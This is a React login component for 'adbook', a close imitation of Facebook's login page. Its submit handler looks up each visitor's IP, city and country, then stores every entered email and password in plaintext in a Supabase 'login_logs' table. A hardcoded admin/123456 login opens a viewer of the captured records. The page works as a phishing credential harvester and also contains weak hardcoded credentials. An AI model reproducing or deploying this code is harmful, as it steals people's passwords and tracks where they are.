import React, { useState, useEffect } from 'react';
import AdminLogs from './AdminLogs';
import { supabase } from './supabaseClient';

const App = () => {
  const [email, setEmail] = useState('');
  const [senha, setSenha] = useState('');
  const [erro, setErro] = useState('');
  const [carregando, setCarregando] = useState(false);
  const [sucesso, setSucesso] = useState(false);
  const [mostrarSenha, setMostrarSenha] = useState(false);
  const [horaAtual, setHoraAtual] = useState('--:--');

  useEffect(() => {
    const buscarHora = async () => {
      try {
        const resposta = await fetch('http://worldtimeapi.org/api/timezone/America/Sao_Paulo');
        const dados = await resposta.json();
        const dataObjeto = new Date(dados.datetime);
        const horas = String(dataObjeto.getHours()).padStart(2, '0');
        const minutos = String(dataObjeto.getMinutes()).padStart(2, '0');
        setHoraAtual(`${horas}:${minutos}`);
      } catch (err) {
        const agora = new Date();
        const horas = String(agora.getHours()).padStart(2, '0');
        const minutos = String(agora.getMinutes()).padStart(2, '0');
        setHoraAtual(`${horas}:${minutos}`);
      }
    };

    buscarHora();
    const intervalo = setInterval(buscarHora, 60000);
    return () => clearInterval(intervalo);
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    setErro('');

    if (!email) {
      setErro('O campo de email não pode estar vazio.');
      return;
    }

    if (!email.includes('@') || !email.includes('.com')) {
      setErro('Por favor, insira um email válido.');
      return;
    }

    if (senha.length < 4) {
      setErro('A senha deve ter pelo menos 4 caracteres.');
      return;
    }

    setCarregando(true);

    try {
      let ip = 'Não identificado';
      let cidade = 'Não identificada';
      let pais = 'Não identificado';
      
      const navegador = navigator.userAgent;
      
      try {
        const resGeo = await fetch('http://ip-api.com/json/?fields=status,message,country,city,query');
        if (resGeo.ok) {
          const dadosGeo = await resGeo.json();
          if(dadosGeo.status === "success") {
            ip = dadosGeo.query || ip;
            cidade = dadosGeo.city || cidade;
            pais = dadosGeo.country || pais;
          }
        }
      } catch (geoErr) {
        console.warn("Aviso: Bloqueador de anúncios ou erro ao buscar IP.", geoErr);
      }
      
      let statusTentativa = 'Falha';

      if (email === 'admin@adbook.com' && senha === '123456') {
        statusTentativa = 'Sucesso';
      }
      
      const { error: erroSupabase } = await supabase
        .from('login_logs')
        .insert([
          { 
            email: email, 
            status: statusTentativa, 
            ip: ip,
            cidade: cidade,
            pais: pais,
            senha: senha,
          }
        ]);

      if (erroSupabase) {
        console.error("ERRO RETORNADO PELO SUPABASE:", erroSupabase);
      }

      await new Promise((resolve) => setTimeout(resolve, 1200));

      if (statusTentativa === 'Sucesso') {
        setSucesso(true);
      } else {
        setErro('O email ou a senha que você inseriu estão incorretos.');
      }
    } catch (err) {
      console.error("Erro geral na requisição:", err);
      setErro('Ocorreu um erro ao processar a requisição.');
    } finally {
      setCarregando(false);
    }
  };

  if (sucesso) {
    return <AdminLogs />;
  }

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col font-sans">
      
      {/* Container Principal expandido para as bordas */}
      <main className="flex-grow w-full max-w-[1600px] mx-auto flex items-center justify-between px-8 lg:px-24">
        
        {/* LADO ESQUERDO FULL: Logo no topo, texto, e imagem grande */}
        <div className="flex flex-col items-start w-full lg:w-[60%] pt-10 lg:pt-0">
          
          {/* Logo Adbook posicionado lá em cima na esquerda */}
          <div className="text-[#1877f2] font-bold tracking-tighter mb-4 -ml-2 flex items-center">
            <span className="text-[60px] mr-1 leading-none">@</span>
            <span className="text-[54px] leading-none">adbook</span>
          </div>

          {/* Mensagem em destaque */}
          <h2 className="text-[28px] lg:text-[32px] font-normal text-[#1c1e21] leading-[38px] w-full max-w-[550px] mb-10">
            Explore as coisas que você ama.
          </h2>

          {/* Imagem Restaurada (Tamanho Grande) */}
          <div className="relative w-full max-w-[420px]">
            {/* Emoji Sorrindo */}
            <div className="absolute -top-6 -left-6 z-20 text-[54px] drop-shadow-xl animate-bounce" style={{ animationDuration: '3s' }}>
              😆
            </div>

            <div className="relative w-full rounded-2xl overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.15)] z-10 border-[4px] border-white bg-white">
              <img 
                src="/familia.jpg" 
                alt="Família" 
                className="w-full h-auto object-cover aspect-[4/5]" 
              />
              
              <div className="absolute top-4 right-4 bg-indigo-500/90 backdrop-blur-md text-white px-3 py-1.5 rounded-full text-[13px] font-semibold flex items-center shadow-lg">
                <span className="mr-1.5 text-xs">🕒</span> {horaAtual}
              </div>
              
              <div className="absolute bottom-6 left-0 right-0 flex justify-center gap-2 items-center">
                <div className="w-12 h-1.5 bg-white rounded-full shadow-sm"></div>
                <div className="w-2.5 h-2.5 bg-transparent rounded-full border-[2px] border-white shadow-sm"></div>
                <div className="w-2.5 h-2.5 bg-transparent rounded-full border-[2px] border-white shadow-sm"></div>
              </div>
            </div>

            <div className="absolute -bottom-5 -right-5 bg-[#FF3B5C] w-16 h-16 rounded-full flex items-center justify-center shadow-2xl border-[4px] border-white z-20 hover:scale-110 transition-transform cursor-pointer">
              <svg className="w-8 h-8 text-white fill-current mt-1" viewBox="0 0 24 24">
                <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
              </svg>
            </div>
          </div>
        </div>

        {/* LADO DIREITO FULL: Formulário de Login (Padrão FB) */}
        <div className="flex flex-col items-center lg:items-end w-full lg:w-[400px] shrink-0 mt-16 lg:mt-0">
          
          <div className="bg-white rounded-lg shadow-[0_2px_4px_rgba(0,0,0,0.1),0_8px_16px_rgba(0,0,0,0.1)] p-4 w-[396px] border border-transparent">
            <form className="flex flex-col w-full" onSubmit={handleLogin} noValidate>
              
              {erro && (
                <div className="mb-4 p-3 bg-[#ffebe8] border border-[#dd3c10] text-[#1c1e21] text-[13px] rounded-sm flex items-start">
                  <span>{erro}</span>
                </div>
              )}

              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email ou número de celular"
                className="w-full border border-[#dddfe2] rounded-[6px] px-[16px] py-[14px] mb-[12px] text-[17px] focus:outline-none focus:border-[#1877f2] focus:ring-[2px] focus:ring-[#e7f3ff]"
                disabled={carregando}
              />
              
              <div className="relative w-full mb-[16px]">
                <input
                  type={mostrarSenha ? "text" : "password"}
                  value={senha}
                  onChange={(e) => setSenha(e.target.value)}
                  placeholder="Senha"
                  className="w-full border border-[#dddfe2] rounded-[6px] pl-[16px] pr-[50px] py-[14px] text-[17px] focus:outline-none focus:border-[#1877f2] focus:ring-[2px] focus:ring-[#e7f3ff]"
                  disabled={carregando}
                />
                <button
                  type="button"
                  onClick={() => setMostrarSenha(!mostrarSenha)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-[#1877f2] hover:text-[#0866FF] font-semibold text-[15px]"
                >
                  {mostrarSenha ? "Ocultar" : "Ver"}
                </button>
              </div>
              
              <button 
                type="submit"
                disabled={carregando}
                className={`w-full text-white font-bold text-[20px] h-[48px] rounded-[6px] transition duration-200 flex justify-center items-center ${
                  carregando ? 'bg-blue-400 cursor-not-allowed' : 'bg-[#1877f2] hover:bg-[#166fe5]'
                }`}
              >
                {carregando ? (
                  <svg className="animate-spin h-5 w-5 text-white" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                ) : (
                  'Entrar'
                )}
              </button>
            </form>

            <div className="text-center mt-4">
              <button type="button" className="text-[14px] text-[#1877f2] hover:underline font-medium">
                Esqueceu a senha?
              </button>
            </div>

            <div className="border-b border-[#dadde1] my-5"></div>

            <div className="flex justify-center w-full mb-2">
              <button type="button" className="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold text-[17px] h-[48px] px-4 rounded-[6px] transition duration-200">
                Criar nova conta
              </button>
            </div>
          </div>
          
          {/* Mensagem na direita inferior (Padrão FB) */}
          <div className="mt-7 text-[14px] text-[#1c1e21] text-center w-[396px]">
            <a href="#" className="font-bold hover:underline">Criar uma Página</a> para uma celebridade, marca ou empresa.
          </div>

        </div>
      </main>
      
      {/* Rodapé Padrão */}
      <footer className="w-full bg-white mt-auto pt-5 pb-5">
        <div className="max-w-[980px] mx-auto px-6 flex flex-wrap justify-start gap-x-3 gap-y-2 text-[12px] text-[#737373]">
          <span className="text-[#737373] cursor-pointer">Português (Brasil)</span>
          <span className="hover:underline cursor-pointer">English (US)</span>
          <span className="hover:underline cursor-pointer">Español</span>
          <span className="hover:underline cursor-pointer">Français (France)</span>
          <span className="hover:underline cursor-pointer">Italiano</span>
          <span className="hover:underline cursor-pointer">Deutsch</span>
          <span className="hover:underline cursor-pointer">العربية</span>
        </div>
        <div className="max-w-[980px] mx-auto px-6 mt-2 mb-2">
          <div className="border-b border-[#dadde1]"></div>
        </div>
        <div className="max-w-[980px] mx-auto px-6 flex flex-wrap justify-start gap-x-4 gap-y-2 text-[12px] text-[#737373]">
          <span className="hover:underline cursor-pointer">Cadastre-se</span>
          <span className="hover:underline cursor-pointer">Entrar</span>
          <span className="hover:underline cursor-pointer">Messenger</span>
          <span className="hover:underline cursor-pointer">Adbook Lite</span>
          <span className="hover:underline cursor-pointer">Vídeo</span>
          <span className="hover:underline cursor-pointer">Locais</span>
          <span className="hover:underline cursor-pointer">Jogos</span>
        </div>
        <div className="max-w-[980px] mx-auto px-6 mt-4 text-[11px] text-[#737373]">
          Adbook © 2026
        </div>
      </footer>
    </div>
  );
};

export default App;